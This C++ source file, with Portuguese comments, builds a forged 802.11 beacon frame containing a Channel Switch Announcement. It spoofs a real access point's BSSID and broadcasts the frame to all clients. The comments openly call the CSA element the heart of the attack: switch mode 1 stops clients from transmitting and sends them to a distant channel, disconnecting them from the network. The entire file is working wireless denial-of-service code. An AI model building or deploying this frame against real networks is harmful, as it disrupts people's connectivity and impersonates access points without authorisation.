#include "csa_beacon_builder.h"
#include <cstring>

size_t CsaBeaconBuilder::build(const uint8_t bssid[6], const String &ssid,
                               uint8_t currentChannel, uint8_t newChannel,
                               uint8_t switchCount, uint8_t *out, size_t outCap) {
  size_t ssidLen = ssid.length();
  if (ssidLen > 32) ssidLen = 32;

  // header(24) + fixos(12) + SSID(2+n) + rates(2+8) + DS(2+1) + CSA(2+3)
  size_t need = 24 + 12 + (2 + ssidLen) + (2 + 8) + (2 + 1) + (2 + 3);
  if (outCap < need) return 0;

  size_t i = 0;

  // --- Cabecalho 802.11 (management, subtype beacon = 0x80) ---
  out[i++] = 0x80; out[i++] = 0x00;        // frame control
  out[i++] = 0x00; out[i++] = 0x00;        // duration
  memset(out + i, 0xFF, 6); i += 6;        // addr1 = broadcast (todos os clientes)
  memcpy(out + i, bssid, 6); i += 6;       // addr2 = BSSID (spoofado: fingimos ser o AP)
  memcpy(out + i, bssid, 6); i += 6;       // addr3 = BSSID
  out[i++] = 0x00; out[i++] = 0x00;        // seq control (o HW reescreve com en_sys_seq)

  // --- Campos fixos do beacon (12 bytes) ---
  memset(out + i, 0x00, 8); i += 8;        // timestamp
  out[i++] = 0x64; out[i++] = 0x00;        // beacon interval (100 TU)
  out[i++] = 0x31; out[i++] = 0x04;        // capability info (ESS + Privacy)

  // --- SSID (tag 0) ---
  out[i++] = 0x00; out[i++] = (uint8_t)ssidLen;
  memcpy(out + i, ssid.c_str(), ssidLen); i += ssidLen;

  // --- Supported Rates (tag 1): taxas basicas de 2.4GHz ---
  out[i++] = 0x01; out[i++] = 0x08;
  static const uint8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
  memcpy(out + i, rates, 8); i += 8;

  // --- DS Parameter Set (tag 3): canal onde o beacon diz estar (o atual) ---
  out[i++] = 0x03; out[i++] = 0x01; out[i++] = currentChannel;

  // --- Channel Switch Announcement (tag 37 = 0x25): o coracao do ataque ---
  out[i++] = 0x25; out[i++] = 0x03;
  out[i++] = 0x01;          // switch mode = 1: cliente para de transmitir ate trocar
  out[i++] = newChannel;    // canal novo (longe do real, o cliente se perde)
  out[i++] = switchCount;   // quantos beacons ate a troca acontecer

  return i;
}
